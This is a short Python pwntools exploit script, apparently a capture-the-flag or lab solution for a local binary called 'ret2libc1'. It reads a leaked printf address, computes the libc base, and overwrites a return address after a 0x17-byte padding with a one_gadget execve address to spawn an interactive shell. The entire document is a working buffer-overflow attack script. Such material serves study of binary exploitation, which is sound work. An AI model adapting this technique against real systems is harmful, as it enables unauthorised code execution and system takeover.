#!/bin/python3

from pwn import *

p = process('./ret2libc1')
e = ELF('./ret2libc1')

# find local location of libc with `ldd <binary>`
l = ELF('/lib/x86_64-linux-gnu/libc.so.6') 


printf_address = int(p.recvuntil('\n').rstrip(), 16)


'''
Now get the libc base address by finding the difference
between the libc printf and our printf
'''

libc_base_address = printf_address - l.sym['printf']

# print(hex(libc_base_address))
# This address should end with 3 0s in its hex representation

one_gadget_libc_execve_out = [0xcb79a, 0xcb79d, 0xcb7a0] # use any of these until it works

libc_execve_address = libc_base_address + one_gadget_libc_execve_out[1]

offset = 0x17

payload = b"A"*offset
payload += p64(libc_execve_address)

p.sendline(payload)

p.interactive()



